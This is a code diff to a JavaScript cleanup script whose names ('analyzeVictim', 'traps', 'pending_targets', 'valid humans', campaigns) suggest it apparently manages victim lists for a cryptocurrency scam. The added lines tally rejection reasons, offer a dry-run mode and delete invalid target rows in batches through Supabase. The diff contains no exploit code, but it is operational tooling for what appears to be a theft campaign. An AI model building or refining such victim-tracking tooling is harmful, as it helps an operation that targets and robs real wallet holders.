@@ -454,7 +454,7 @@ async function analyzeVictim(address, chainId) {
 
 // ─── Main ───
 async function runCleanup() {
-    console.log('[+] Fetching all traps with campaign and user info...\n');
+    console.log('[+] Fetching all pending_targets...\n');
 
     let traps = [];
     try {
@@ -597,6 +597,51 @@ async function runCleanup() {
     console.log(`  ├─ Valid humans:             ${valid}`);
     console.log(`  ├─ Invalid (total):          ${invalid}`);
     console.log(`  ├─ RPC failures (preserved): ${rpcFails}`);
+    console.log(`  └─ Invalid targets to purge: ${totalInvalidTargets}`);
 
+    if (reasonCounts.size > 0) {
+        console.log('\n  📋 Rejection reasons:');
+        const sorted = [...reasonCounts.entries()].sort((a, b) => b[1] - a[1]);
+        for (const [reason, count] of sorted) {
+            console.log(`     ├─ ${reason}: ${count}`);
+        }
+    }
+
+    if (isDryRun) {
+        console.log('\n[🔍 DRY-RUN COMPLETE]');
+        console.log(`  └─ ${totalInvalidTargets} pending_targets WOULD be purged.`);
+        console.log('\n[i] No database changes were executed. Run without --dry-run to delete.\n');
+        return;
+    }
+
+    // ─── Execute Deletion (ONLY from pending_targets) ───
+    if (invalidIds.size > 0) {
+        console.log(`\n[!] Executing database purge for ${invalidIds.size} invalid pending_targets...\n`);
+        const idsArray = Array.from(invalidIds);
+        const DELETE_CHUNK_SIZE = 100;
+        let totalDeleted = 0;
+
+        for (let i = 0; i < idsArray.length; i += DELETE_CHUNK_SIZE) {
+            const chunk = idsArray.slice(i, i + DELETE_CHUNK_SIZE);
+
+            // 🎯 STRICTLY pending_targets — we do NOT touch the traps table
+            const { error, count } = await supabase
+                .from('pending_targets')
+                .delete({ count: 'exact' })
+                .in('id', chunk);
+
+            if (error) {
+                console.error(`  [-] pending_targets delete error:`, error.message);
+            } else {
+                totalDeleted += (count || 0);
+            }
+        }
+        console.log(`  [+] Successfully deleted ${totalDeleted} rows from pending_targets.`);
+        console.log('  [✓] The traps table was NOT touched.\n');
+    } else {
+        console.log('\n[+] Database is clean. No invalid pending_targets found to purge.\n');
+    }
+
+    console.log('[🎉] pending_targets cleanup complete!\n');
 }
 runCleanup();
